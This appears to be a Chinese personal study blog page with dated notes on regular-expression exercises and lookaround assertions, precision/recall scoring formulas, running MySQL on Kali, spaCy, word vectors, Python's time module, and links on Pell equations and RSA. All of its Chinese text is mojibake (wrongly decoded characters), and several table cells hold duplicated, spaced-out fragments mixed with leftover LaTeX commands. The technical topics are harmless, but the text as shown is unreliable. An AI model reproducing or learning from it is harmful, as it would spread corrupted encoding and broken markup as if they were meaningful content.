<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810135752929.png" class="" title="image-20230810135752929">

<ul>
<li><code>(\w&#123;1,3&#125;)</code></li>
<li><code>\&lt;([\w]&#123;1,3&#125;)[\&gt;\s]?[\w]+\=?[\W\w]+</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810153957287.png" class="" title="image-20230810153957287">

<ul>
<li><code>^(\w+)\.?(png|jpg|gif)$</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810160942281.png" class="" title="image-20230810160942281">

<ul>
<li><code>[\s]+(.*)</code></li>
<li><code>^\s*(.*)\s*$</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810162117600.png" class="" title="image-20230810162117600">

<ul>
<li><code>.*\.(\w+)\(([\w\.]+):(\d+)\)</code></li>
<li><code>(\w+)\(([\w\.]+):(\d+)\)</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810162653328.png" class="" title="image-20230810162653328">

<ul>
<li><code>(\w+)://([\w\.-]+)[:]?(\d+)?</code></li>
<li><code>(\w+)://([\w\-\.]+)(:(\d+))?</code></li>
<li><code>^(\w+)://([\w\.-]+)[:]?(\d+)?.*$</code></li>
<li>â€¦â€¦</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810171444793.png" class="" title="image-20230810171444793">

<h1 id="230818"><a href="#230818" class="headerlink" title="230818"></a>230818</h1><h2 id="æ­£åˆ™åŒ¹é…è¿›é˜¶"><a href="#æ­£åˆ™åŒ¹é…è¿›é˜¶" class="headerlink" title="æ­£åˆ™åŒ¹é…è¿›é˜¶"></a>æ­£åˆ™åŒ¹é…è¿›é˜¶</h2><h3 id="é”šç‚¹"><a href="#é”šç‚¹" class="headerlink" title="é”šç‚¹"></a>é”šç‚¹</h3><ul>
<li><code>^</code>ç”¨æ¥æ£€æŸ¥åŒ¹é…çš„å­—ç¬¦ä¸²æ˜¯å¦åœ¨æ‰€åŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´ã€‚</li>
<li>åŒç†äº <code>^</code>å·ï¼Œ <code>$</code>å·ç”¨æ¥åŒ¹é…å­—ç¬¦æ˜¯å¦æ˜¯æœ€åä¸€ä¸ªã€‚ ä¾‹å¦‚ï¼Œ<code>(at\.)$</code> åŒ¹é…ä»¥<code>at.</code>ç»“å°¾çš„å­—ç¬¦ä¸²ã€‚</li>
</ul>
<h3 id="é›¶å®½åº¦æ–­è¨€"><a href="#é›¶å®½åº¦æ–­è¨€" class="headerlink" title="é›¶å®½åº¦æ–­è¨€"></a>é›¶å®½åº¦æ–­è¨€</h3><p>å…ˆè¡Œæ–­è¨€å’Œåå‘æ–­è¨€ï¼ˆåˆç§° lookaroundï¼‰éƒ½å±äºéæ•è·ç»„ï¼ˆç”¨äºåŒ¹é…æ¨¡å¼ï¼Œä½†ä¸åŒ…æ‹¬åœ¨åŒ¹é…åˆ—è¡¨ä¸­ï¼‰ã€‚å½“æˆ‘ä»¬éœ€è¦ä¸€ä¸ªæ¨¡å¼çš„å‰é¢æˆ–åé¢æœ‰å¦ä¸€ä¸ªç‰¹å®šçš„æ¨¡å¼æ—¶ï¼Œå°±å¯ä»¥ä½¿ç”¨å®ƒä»¬ã€‚</p>
<p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¸Œæœ›ä»ä¸‹é¢çš„è¾“å…¥å­—ç¬¦ä¸² $4.44 å’Œ $10.88 ä¸­è·å¾—æ‰€æœ‰ä»¥ <code>$</code> å­—ç¬¦å¼€å¤´çš„æ•°å­—ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä»¥ä¸‹ çš„æ­£åˆ™è¡¨è¾¾å¼ <code>(?&lt;=\$)[0-9\.]* </code>ã€‚æ„æ€æ˜¯ï¼šè·å–æ‰€æœ‰åŒ…å« <code>.</code> å¹¶ä¸”å‰é¢æ˜¯ <code>$</code> çš„æ•°å­—ã€‚</p>
<p><strong>é›¶å®½åº¦æ–­è¨€</strong></p>
<table>
<thead>
<tr>
<th>ç¬¦å·</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>?&#x3D;</td>
<td>æ­£å…ˆè¡Œæ–­è¨€-å­˜åœ¨</td>
</tr>
<tr>
<td>?!</td>
<td>è´Ÿå…ˆè¡Œæ–­è¨€-æ’é™¤</td>
</tr>
<tr>
<td>?&lt;&#x3D;</td>
<td>æ­£åå‘æ–­è¨€-å­˜åœ¨</td>
</tr>
<tr>
<td>?&lt;!</td>
<td>è´Ÿåå‘æ–­è¨€-æ’é™¤</td>
</tr>
</tbody></table>
<h4 id="æ­£å…ˆè¡Œæ–­è¨€-å­˜åœ¨"><a href="#æ­£å…ˆè¡Œæ–­è¨€-å­˜åœ¨" class="headerlink" title="?=æ­£å…ˆè¡Œæ–­è¨€-å­˜åœ¨"></a><code>?=</code>æ­£å…ˆè¡Œæ–­è¨€-å­˜åœ¨</h4><p><code>?=</code> æ­£å…ˆè¡Œæ–­è¨€ï¼Œè¡¨ç¤ºç¬¬ä¸€éƒ¨åˆ†è¡¨è¾¾å¼ä¹‹åå¿…é¡»è·Ÿç€ <code>?=</code> å®šä¹‰çš„è¡¨è¾¾å¼ã€‚ </p>
<p>è¿”å›ç»“æœåªåŒ…å«æ»¡è¶³åŒ¹é…æ¡ä»¶çš„ç¬¬ä¸€éƒ¨åˆ†è¡¨è¾¾å¼ã€‚ </p>
<p>å®šä¹‰ä¸€ä¸ªæ­£å…ˆè¡Œæ–­è¨€è¦ä½¿ç”¨ <code>()</code> ã€‚åœ¨æ‹¬å·å†…éƒ¨ä½¿ç”¨ä¸€ä¸ªé—®å·å’Œç­‰å·ï¼š <code>(?=...)</code> ã€‚ </p>
<p>æ­£å…ˆè¡Œæ–­è¨€çš„å†…å®¹å†™åœ¨æ‹¬å·ä¸­çš„ç­‰å·åé¢ã€‚</p>
<h4 id="è´Ÿå…ˆè¡Œæ–­è¨€-æ’é™¤"><a href="#è´Ÿå…ˆè¡Œæ–­è¨€-æ’é™¤" class="headerlink" title="?!è´Ÿå…ˆè¡Œæ–­è¨€-æ’é™¤"></a><code>?!</code>è´Ÿå…ˆè¡Œæ–­è¨€-æ’é™¤</h4><p>è´Ÿå…ˆè¡Œæ–­è¨€<code>?!</code>ç”¨äºç­›é€‰æ‰€æœ‰åŒ¹é…ç»“æœï¼Œç­›é€‰æ¡ä»¶ä¸ºå…¶åä¸è·Ÿéšç€æ–­è¨€ä¸­å®šä¹‰çš„æ ¼å¼ã€‚ </p>
<p>æ­£å…ˆè¡Œæ–­è¨€å®šä¹‰å’Œè´Ÿå…ˆè¡Œæ–­è¨€ ä¸€æ ·ï¼ŒåŒºåˆ«å°±æ˜¯<code>=</code>æ›¿æ¢æˆ<code>!</code>ä¹Ÿå°±æ˜¯ <code>(?!...)</code> ã€‚</p>
<h4 id="lt-æ­£åå‘æ–­è¨€-å­˜åœ¨"><a href="#lt-æ­£åå‘æ–­è¨€-å­˜åœ¨" class="headerlink" title="?&lt;=æ­£åå‘æ–­è¨€-å­˜åœ¨"></a><code>?&lt;=</code>æ­£åå‘æ–­è¨€-å­˜åœ¨</h4><p>æ­£åå‘æ–­è¨€è®°ä½œ<code>(?&lt;=...)</code>ç”¨äºç­›é€‰æ‰€æœ‰åŒ¹é…ç»“æœï¼Œç­›é€‰æ¡ä»¶ä¸ºå…¶å‰è·Ÿéšç€æ–­è¨€ä¸­å®šä¹‰çš„æ ¼å¼ã€‚</p>
<h4 id="lt-è´Ÿåå‘æ–­è¨€-æ’é™¤"><a href="#lt-è´Ÿåå‘æ–­è¨€-æ’é™¤" class="headerlink" title="?&lt;!è´Ÿåå‘æ–­è¨€-æ’é™¤"></a><code>?&lt;!</code>è´Ÿåå‘æ–­è¨€-æ’é™¤</h4><p>è´Ÿåå‘æ–­è¨€è®°ä½œ<code>(?&lt;!...)</code>ç”¨äºç­›é€‰æ‰€æœ‰åŒ¹é…ç»“æœï¼Œç­›é€‰æ¡ä»¶ä¸ºå…¶å‰ä¸è·Ÿéšç€æ–­è¨€ä¸­å®šä¹‰çš„æ ¼å¼ã€‚</p>
<h3 id="æ ‡å¿—"><a href="#æ ‡å¿—" class="headerlink" title="æ ‡å¿—"></a>æ ‡å¿—</h3><p>æ ‡å¿—ä¹Ÿå«æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå› ä¸ºå®ƒå¯ä»¥ç”¨æ¥ä¿®æ”¹è¡¨è¾¾å¼çš„æœç´¢ç»“æœã€‚ </p>
<p>è¿™äº›æ ‡å¿—å¯ä»¥ä»»æ„çš„ç»„åˆä½¿ç”¨ï¼Œå®ƒä¹Ÿæ˜¯æ•´ä¸ªæ­£åˆ™è¡¨è¾¾å¼çš„ä¸€éƒ¨åˆ†ã€‚</p>
<table>
<thead>
<tr>
<th>æ ‡å¿—</th>
<th>æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>å¿½ç•¥å¤§å°å†™</td>
</tr>
<tr>
<td>g</td>
<td>å…¨å±€æœç´¢</td>
</tr>
<tr>
<td>m</td>
<td>å¤šè¡Œä¿®é¥°ç¬¦ï¼šé”šç‚¹å…ƒå­—ç¬¦<code>^</code>ï¼Œ<code>$</code>å·¥ä½œèŒƒå›´åœ¨æ¯è¡Œèµ·å§‹</td>
</tr>
</tbody></table>
<h4 id="å¿½ç•¥å¤§å°å†™"><a href="#å¿½ç•¥å¤§å°å†™" class="headerlink" title="å¿½ç•¥å¤§å°å†™"></a>å¿½ç•¥å¤§å°å†™</h4><p>ä¿®é¥°è¯­<code>i</code>ç”¨äºå¿½ç•¥å¤§å°å†™ã€‚</p>
<h4 id="å…¨å±€æœç´¢"><a href="#å…¨å±€æœç´¢" class="headerlink" title="å…¨å±€æœç´¢"></a>å…¨å±€æœç´¢</h4><p>ä¿®é¥°ç¬¦ <code>g</code> å¸¸ç”¨äºæ‰§è¡Œä¸€ä¸ªå…¨å±€æœç´¢åŒ¹é…ï¼Œå³ï¼ˆä¸ä»…ä»…è¿”å›ç¬¬ä¸€ä¸ªåŒ¹é…çš„ï¼Œè€Œæ˜¯è¿”å›å…¨éƒ¨ï¼‰ã€‚</p>
<h4 id="å¤šè¡Œä¿®é¥°ç¬¦"><a href="#å¤šè¡Œä¿®é¥°ç¬¦" class="headerlink" title="å¤šè¡Œä¿®é¥°ç¬¦"></a>å¤šè¡Œä¿®é¥°ç¬¦</h4><p>å¤šè¡Œä¿®é¥°ç¬¦ <code>m</code> å¸¸ç”¨äºæ‰§è¡Œä¸€ä¸ªå¤šè¡ŒåŒ¹é…ã€‚</p>
<h3 id="è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…"><a href="#è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…" class="headerlink" title="è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…"></a>è´ªå©ªåŒ¹é…ä¸æƒ°æ€§åŒ¹é…</h3><p>æ­£åˆ™è¡¨è¾¾å¼é»˜è®¤é‡‡ç”¨è´ªå©ªåŒ¹é…æ¨¡å¼ï¼Œåœ¨è¯¥æ¨¡å¼ä¸‹æ„å‘³ç€ä¼šåŒ¹é…å°½å¯èƒ½é•¿çš„å­ä¸²ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>?</code> å°†è´ªå©ªåŒ¹é… æ¨¡å¼è½¬åŒ–ä¸ºæƒ°æ€§åŒ¹é…æ¨¡å¼ã€‚</p>
<p><em><code>?</code>å¯¹å…¶è¿›è¡Œæˆªæ–­ã€‚ä»è€Œå‡å°‘åŒ¹é…çš„é•¿å­ä¸²ã€‚</em></p>
<p>$$<br>æ­£ç¡®ç‡ &#x3D; (\frac{æäº¤æ­£ç¡®æ¡æ•°}{æäº¤å…¨éƒ¨æ¡æ•°}) \times 100<br>$$</p>
<p>$$<br>å¬å›ç‡ &#x3D; (\frac{æäº¤æ­£ç¡®æ¡æ•°}{æ­£ç¡®æ ·æœ¬æ¡æ•°}) \times 100<br>$$</p>
<p>$$<br>å•ç±»å‹åˆ†æ•° &#x3D; \frac{2 \times æ­£ç¡®ç‡ \times å¬å›ç‡}{æ­£ç¡®ç‡ + å¬å›ç‡}<br>$$</p>
<p>$$<br>æ€»åˆ†æ•° &#x3D; \frac{1}{n}\sum_{i&#x3D;1}^{n} å•ç±»å‹åˆ†æ•°_i<br>$$</p>
<h1 id="230905"><a href="#230905" class="headerlink" title="230905"></a>230905</h1><h2 id="kaliå®ç°mysqlè¿è¡Œ"><a href="#kaliå®ç°mysqlè¿è¡Œ" class="headerlink" title="kaliå®ç°mysqlè¿è¡Œ"></a>kaliå®ç°mysqlè¿è¡Œ</h2><p>ç›´æ¥è¿è¡Œ<code>mysql -u root</code>ï¼Œä¼šå‡ºç°æŠ¥é”™<code>ERROR 2002 (HY000): Canâ€˜t connect to local MySQL server through socket â€˜/tmp/mysql.sockâ€˜ (2)</code>ã€‚</p>
<h3 id="ç›®å‰è§£å†³æ–¹æ³•"><a href="#ç›®å‰è§£å†³æ–¹æ³•" class="headerlink" title="ç›®å‰è§£å†³æ–¹æ³•"></a>ç›®å‰è§£å†³æ–¹æ³•</h3><blockquote>
<p><a href="https://blog.csdn.net/zhy_27/article/details/114944433">WSLä¸‹Kali 2021 å¯ç”¨mysqlæœåŠ¡å¹¶é€šè¿‡ä¸»æœºè¿æ¥_kali mysql è¿æ¥ å¦å¤–ä¸»æœº_zhy_27çš„åšå®¢-CSDNåšå®¢</a></p>
</blockquote>
<ul>
<li><p>æ‰“å¼€<code>mysql</code>ç¯å¢ƒ<code>sudo service mysql start</code></p>
</li>
<li><p>ç›´æ¥è¿è¡Œ<code>mysql</code></p>
</li>
<li><p>åˆ›å»ºæ–°çš„æ•°æ®åº“ï¼š<code>create database test;</code></p>
</li>
<li><p>è½¬æ¢åˆ°æ–°åˆ›å»ºçš„æ•°æ®åº“ï¼š<code>use test;</code></p>
</li>
<li><p>å¯¼å…¥sqlæ–‡ä»¶ï¼š<code>source xx.sql;</code></p>
</li>
<li><p>æŸ¥çœ‹å½“å‰æ•°æ®åº“ä¸‹çš„è¡¨åï¼š<code>show tables;</code></p>
</li>
<li><p>æŸ¥çœ‹å¯¹åº”åˆ—ä¸‹çš„æ•°æ®ï¼š<code>select xx from [tables];</code></p>
</li>
<li><p>å…³é—­æ•°æ®åº“æœåŠ¡ï¼š<code>service mysql stop</code></p>
</li>
</ul>
<h2 id="spacy"><a href="#spacy" class="headerlink" title="spacy"></a>spacy</h2><p>æ¯ä¸ªå…ƒç»„ç”±ä¸‰ä¸ªå€¼æ„æˆï¼šåŒ¹é…åˆ°çš„IDï¼ŒåŒ¹é…åˆ°çš„è·¨åº¦çš„èµ·å§‹å’Œç»ˆæ­¢ç´¢å¼•ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230905162404171.png" class="" title="image-20230905162404171">

<img src="/2023/12/31/WeeklyStudy/image-20230905162529711.png" class="" title="image-20230905162529711">

<h1 id="230906"><a href="#230906" class="headerlink" title="230906"></a>230906</h1><h2 id="ç‰¹å¾å·¥ç¨‹ä»¥åŠè®­ç»ƒæ¨¡å‹"><a href="#ç‰¹å¾å·¥ç¨‹ä»¥åŠè®­ç»ƒæ¨¡å‹" class="headerlink" title="ç‰¹å¾å·¥ç¨‹ä»¥åŠè®­ç»ƒæ¨¡å‹"></a>ç‰¹å¾å·¥ç¨‹ä»¥åŠè®­ç»ƒæ¨¡å‹</h2><p>è¯å‘é‡æ˜¯å°†å­—ã€è¯è¯­è½¬æ¢æˆå‘é‡çŸ©é˜µçš„è®¡ç®—æ¨¡å‹ã€‚</p>
<p>ç›®å‰ä¸ºæ­¢æœ€å¸¸ç”¨çš„è¯è¡¨ç¤ºæ–¹æ³•æ˜¯ One-hotï¼Œè¿™ç§æ–¹æ³•æŠŠæ¯ä¸ªè¯è¡¨ç¤ºä¸ºä¸€ä¸ªå¾ˆé•¿çš„å‘é‡ã€‚è¿™ä¸ªå‘é‡çš„ç»´åº¦æ˜¯è¯è¡¨å¤§å°ï¼Œå…¶ä¸­ç»å¤§å¤šæ•°å…ƒç´ ä¸º 0ï¼Œåªæœ‰ä¸€ä¸ªç»´åº¦çš„å€¼ä¸º 1ï¼Œè¿™ä¸ªç»´åº¦å°±ä»£è¡¨äº†å½“å‰çš„è¯ã€‚</p>
<p>è¿˜æœ‰ Google å›¢é˜Ÿçš„ Word2Vecï¼Œå…¶ä¸»è¦åŒ…å«ä¸¤ä¸ªæ¨¡å‹ï¼šè·³å­—æ¨¡å‹ï¼ˆSkip-Gramï¼‰å’Œè¿ç»­è¯è¢‹æ¨¡å‹ï¼ˆContinuous Bag of Wordsï¼Œç®€ç§° CBOWï¼‰ï¼Œä»¥åŠä¸¤ç§é«˜æ•ˆè®­ç»ƒçš„æ–¹æ³•ï¼šè´Ÿé‡‡æ ·ï¼ˆNegative Samplingï¼‰å’Œå±‚åº Softmaxï¼ˆHierarchical Softmaxï¼‰ã€‚</p>
<p>å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒWord2Vec è¯å‘é‡å¯ä»¥è¾ƒå¥½åœ°è¡¨è¾¾ä¸åŒè¯ä¹‹é—´çš„ç›¸ä¼¼å’Œç±»æ¯”å…³ç³»ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€äº›è¯å‘é‡çš„è¡¨ç¤ºæ–¹å¼ï¼Œå¦‚ Doc2Vecã€WordRank å’Œ FastText ç­‰ã€‚</p>
<h2 id="ç‰¹å¾é€‰æ‹©"><a href="#ç‰¹å¾é€‰æ‹©" class="headerlink" title="ç‰¹å¾é€‰æ‹©"></a>ç‰¹å¾é€‰æ‹©</h2><p>åœ¨ä¸€ä¸ªå®é™…é—®é¢˜ä¸­ï¼Œæ„é€ å¥½çš„ç‰¹å¾å‘é‡ï¼Œæ˜¯è¦é€‰æ‹©åˆé€‚çš„ã€è¡¨è¾¾èƒ½åŠ›å¼ºçš„ç‰¹å¾ã€‚æ–‡æœ¬ç‰¹å¾ä¸€èˆ¬éƒ½æ˜¯è¯è¯­ï¼Œå…·æœ‰è¯­ä¹‰ä¿¡æ¯ï¼Œä½¿ç”¨ç‰¹å¾é€‰æ‹©èƒ½å¤Ÿæ‰¾å‡ºä¸€ä¸ªç‰¹å¾å­é›†ï¼Œå…¶ä»ç„¶å¯ä»¥ä¿ç•™è¯­ä¹‰ä¿¡æ¯ï¼›ä½†é€šè¿‡ç‰¹å¾æå–æ‰¾åˆ°çš„ç‰¹å¾å­ç©ºé—´ï¼Œå°†ä¼šä¸¢å¤±éƒ¨åˆ†è¯­ä¹‰ä¿¡æ¯ã€‚</p>
<p>ç›®å‰ï¼Œå¸¸è§çš„ç‰¹å¾é€‰æ‹©æ–¹æ³•ä¸»è¦æœ‰ DFã€ MIã€ IGã€ CHIã€WLLRã€WFO å…­ç§ã€‚</p>
<h1 id="230911"><a href="#230911" class="headerlink" title="230911"></a>230911</h1><h2 id="æ—¶é—´å¤„ç†"><a href="#æ—¶é—´å¤„ç†" class="headerlink" title="æ—¶é—´å¤„ç†"></a>æ—¶é—´å¤„ç†</h2><table>
<thead>
<tr>
<th align="left">å‡½æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">time()</td>
<td align="left">è·å–å½“å‰æ—¶ é—´ æˆ³ \textcolor{red}{æ—¶é—´æˆ³}æ—¶é—´æˆ³</td>
</tr>
<tr>
<td align="left">gmtime()</td>
<td align="left">è·å–å½“å‰æ—¶é—´æˆ³å¯¹åº”çš„ s t r u c t _ t i m e \textcolor{red}{struct_time}struct_tme å¯¹è±¡</td>
</tr>
<tr>
<td align="left">localtime()</td>
<td align="left">è·å–å½“å‰æ—¶é—´æˆ³å¯¹åº”çš„æœ¬ åœ° æ—¶ é—´ \textcolor{red}{æœ¬åœ°æ—¶é—´}æœ¬åœ°æ—¶é—´çš„ struct_time å¯¹è±¡</td>
</tr>
<tr>
<td align="left">ctime()</td>
<td align="left">è·å–å½“å‰æ—¶é—´æˆ³å¯¹åº”çš„æ˜“ è¯» å­— ç¬¦ ä¸² \textcolor{red}{æ˜“è¯»å­—ç¬¦ä¸²}æ˜“è¯»å­—ç¬¦ä¸²è¡¨ç¤ºï¼Œå†…éƒ¨ä¼šè°ƒç”¨ time.localtime()</td>
</tr>
</tbody></table>
<h2 id="struct-time"><a href="#struct-time" class="headerlink" title="struct_time"></a>struct_time</h2><table>
<thead>
<tr>
<th align="left">ä¸‹æ ‡</th>
<th align="left">å±æ€§</th>
<th align="left">å€¼</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">tm_year</td>
<td align="left">å¹´ä»½ï¼Œæ•´æ•°</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">tm_mon</td>
<td align="left">æœˆä»½[1, 12]</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">tm_mday</td>
<td align="left">æ—¥æœŸ[1, 31]</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">tm_hour</td>
<td align="left">å°æ—¶[0, 23]</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">tm_min</td>
<td align="left">åˆ†é’Ÿ[0, 59]</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">tm_sec</td>
<td align="left">ç§’[0, 61]</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">tm_wday</td>
<td align="left">æ˜ŸæœŸ[0, 6]ï¼ˆ0è¡¨ç¤ºæ˜ŸæœŸä¸€ï¼‰</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">tm_yday</td>
<td align="left">è¯¥å¹´ç¬¬å‡ å¤©[1, 366]</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">tm_isdst</td>
<td align="left">æ˜¯å¦å¤æ—¶ä»¤ï¼Œ0å¦, 1æ˜¯, -1æœªçŸ¥</td>
</tr>
</tbody></table>
<h2 id="æ—¶é—´æ ¼å¼åŒ–"><a href="#æ—¶é—´æ ¼å¼åŒ–" class="headerlink" title="æ—¶é—´æ ¼å¼åŒ–"></a>æ—¶é—´æ ¼å¼åŒ–</h2><table>
<thead>
<tr>
<th align="left">å‡½æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mktime()</td>
<td align="left">å°† struct_time å¯¹è±¡ t è½¬ æ¢ ä¸º æ—¶ é—´ æˆ³ \textcolor{red}{è½¬æ¢ä¸ºæ—¶é—´æˆ³}è½¬æ¢ä¸ºæ—¶é—´æˆ³</td>
</tr>
<tr>
<td align="left">strftime()</td>
<td align="left">æ—¶é—´æ ¼ å¼ åŒ– \textcolor{red}{æ ¼å¼åŒ–}æ ¼å¼åŒ–</td>
</tr>
<tr>
<td align="left">strptime()</td>
<td align="left">æå–å­—ç¬¦ä¸²ä¸­çš„æ—¶é—´æ¥ç”Ÿæˆstruct_ time\textcolor{red}{struct_time}struct_time å¯¹è±¡</td>
</tr>
</tbody></table>
<h2 id="strftime"><a href="#strftime" class="headerlink" title="strftime()"></a>strftime()</h2><table>
<thead>
<tr>
<th align="left">æ ¼å¼åŒ–å­—ç¬¦ä¸²</th>
<th align="left">æ—¥æœŸ&#x2F;æ—¶é—´</th>
<th align="left">å€¼èŒƒå›´å’Œå®ä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%Y</td>
<td align="left">å¹´ä»½</td>
<td align="left">0001~9999ï¼Œä¾‹å¦‚ï¼š1900</td>
</tr>
<tr>
<td align="left">%m</td>
<td align="left">æœˆä»½</td>
<td align="left">01~12ï¼Œä¾‹å¦‚ï¼š10</td>
</tr>
<tr>
<td align="left">%B</td>
<td align="left">æœˆå</td>
<td align="left">January~Decemberï¼Œä¾‹å¦‚ï¼šApril</td>
</tr>
<tr>
<td align="left">%b</td>
<td align="left">æœˆåç¼©å†™</td>
<td align="left">Jan~Decï¼Œä¾‹å¦‚ï¼šApr</td>
</tr>
<tr>
<td align="left">%d</td>
<td align="left">æ—¥æœŸ</td>
<td align="left">01 ~ 31ï¼Œä¾‹å¦‚ï¼š25</td>
</tr>
<tr>
<td align="left">%A</td>
<td align="left">æ˜ŸæœŸ</td>
<td align="left">Monday~Sundayï¼Œä¾‹å¦‚ï¼šWednesday</td>
</tr>
<tr>
<td align="left">%a</td>
<td align="left">æ˜ŸæœŸç¼©å†™</td>
<td align="left">Mon~Sunï¼Œä¾‹å¦‚ï¼šWed</td>
</tr>
<tr>
<td align="left">%H</td>
<td align="left">å°æ—¶ï¼ˆ24håˆ¶ï¼‰</td>
<td align="left">00 ~ 23ï¼Œä¾‹å¦‚ï¼š12</td>
</tr>
<tr>
<td align="left">%I</td>
<td align="left">å°æ—¶ï¼ˆ12håˆ¶ï¼‰</td>
<td align="left">01 ~ 12ï¼Œä¾‹å¦‚ï¼š7</td>
</tr>
<tr>
<td align="left">%p</td>
<td align="left">ä¸Š&#x2F;ä¸‹åˆ</td>
<td align="left">AM, PMï¼Œä¾‹å¦‚ï¼šPM</td>
</tr>
<tr>
<td align="left">%M</td>
<td align="left">åˆ†é’Ÿ</td>
<td align="left">00 ~ 59ï¼Œä¾‹å¦‚ï¼š26</td>
</tr>
<tr>
<td align="left">%S</td>
<td align="left">ç§’</td>
<td align="left">00 ~ 59ï¼Œä¾‹å¦‚ï¼š26</td>
</tr>
</tbody></table>
<h2 id="è®¡æ—¶"><a href="#è®¡æ—¶" class="headerlink" title="è®¡æ—¶"></a>è®¡æ—¶</h2><table>
<thead>
<tr>
<th align="left">å‡½æ•°</th>
<th align="left">æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td align="left">sleep(secs)</td>
<td align="left">æš‚åœæ‰§è¡Œè°ƒç”¨çº¿ç¨‹è¾¾åˆ°ç»™å®šçš„ç§’æ•°ã€‚å‚æ•°å¯ä»¥æ˜¯æµ®ç‚¹æ•°ï¼Œä»¥æŒ‡ç¤ºæ›´ç²¾ç¡®çš„ç¡çœ æ—¶é—´ã€‚å®é™…çš„æš‚åœæ—¶é—´å¯èƒ½å°äºè¯·æ±‚çš„æ—¶é—´ï¼Œå› ä¸ºä»»ä½•æ•è·çš„ä¿¡å·å°†åœ¨æ‰§è¡Œè¯¥ä¿¡å·çš„æ•è·ä¾‹ç¨‹åç»ˆæ­¢ sleep() ã€‚æ­¤å¤–ï¼Œç”±äºç³»ç»Ÿä¸­å…¶ä»–æ´»åŠ¨çš„å®‰æ’ï¼Œæš‚åœæ—¶é—´å¯èƒ½æ¯”è¯·æ±‚çš„æ—¶é—´é•¿ä»»æ„é‡ã€‚</td>
</tr>
<tr>
<td align="left">monotonic()</td>
<td align="left">è¿”å›å•è°ƒæ—¶é’Ÿçš„å€¼ï¼ˆä»¥å°æ•°ç§’ä¸ºå•ä½ï¼‰ï¼Œå³ä¸èƒ½å€’é€€çš„æ—¶é’Ÿã€‚æ—¶é’Ÿä¸å—ç³»ç»Ÿæ—¶é’Ÿæ›´æ–°çš„å½±å“ã€‚è¿”å›å€¼çš„å‚è€ƒç‚¹æœªå®šä¹‰ï¼Œå› æ­¤åªæœ‰è¿ç»­è°ƒç”¨ç»“æœä¹‹é—´çš„å·®å¼‚æ‰æœ‰æ•ˆã€‚</td>
</tr>
<tr>
<td align="left">perf_counter()</td>
<td align="left">è¿”å›æ€§èƒ½è®¡æ•°å™¨çš„å€¼ï¼ˆä»¥å°æ•°ç§’ä¸ºå•ä½ï¼‰ï¼Œå³å…·æœ‰æœ€é«˜å¯ç”¨åˆ†è¾¨ç‡çš„æ—¶é’Ÿï¼Œä»¥æµ‹é‡çŸ­æŒç»­æ—¶é—´ã€‚å®ƒç¡®å®åŒ…æ‹¬ç¡çœ æœŸé—´ç»è¿‡çš„æ—¶é—´ï¼Œå¹¶ä¸”æ˜¯ç³»ç»ŸèŒƒå›´çš„ã€‚è¿”å›å€¼çš„å‚è€ƒç‚¹æœªå®šä¹‰ï¼Œå› æ­¤åªæœ‰è¿ç»­è°ƒç”¨ç»“æœä¹‹é—´çš„å·®å¼‚æ‰æœ‰æ•ˆã€‚</td>
</tr>
</tbody></table>
<h2 id="Pellæ–¹ç¨‹ä¸RSA"><a href="#Pellæ–¹ç¨‹ä¸RSA" class="headerlink" title="Pellæ–¹ç¨‹ä¸RSA"></a>Pellæ–¹ç¨‹ä¸RSA</h2><blockquote>
<p><a href="https://hasegawaazusa.github.io/pell-equation-group-note.html">pellæ–¹ç¨‹ä¸ç¾¤çš„ç¬”è®° | ç‹¬å¥ã®å°å±‹ (hasegawaazusa.github.io)</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/524443454">åŒæ„æ˜ å°„çš„æ€§è´¨ - çŸ¥ä¹ (zhihu.com)</a></p>
</blockquote>
